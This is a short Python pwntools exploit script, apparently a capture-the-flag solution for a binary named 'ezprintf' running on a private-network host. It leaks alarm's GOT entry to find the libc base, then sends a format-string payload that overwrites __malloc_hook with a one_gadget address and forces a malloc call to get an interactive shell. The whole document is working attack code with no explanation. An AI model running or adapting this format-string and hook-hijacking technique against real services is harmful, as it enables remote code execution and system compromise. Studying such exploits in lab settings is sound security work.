from pwn import *
alarm_got=0x08049FD4
# conn=process("./ezprintf")
conn=remote("10.131.1.19",60006)
libc=ELF("./bc.so.6")
conn.sendlineafter("Which address you wanna read:\n",str(alarm_got))
alarm_add=int(conn.recvline(),16)
base=alarm_add-libc.symbols["alarm"]
malloc_hook_add=base+libc.symbols["__malloc_hook"]
#one_gadget
writes={
	malloc_hook_add:0x3a80c+base
}
payload=fmtstr_payload(7,writes,numbwritten=0)
print payload
pause()
conn.sendlineafter("Good Bye\n",payload+"%100000c")
conn.interactive()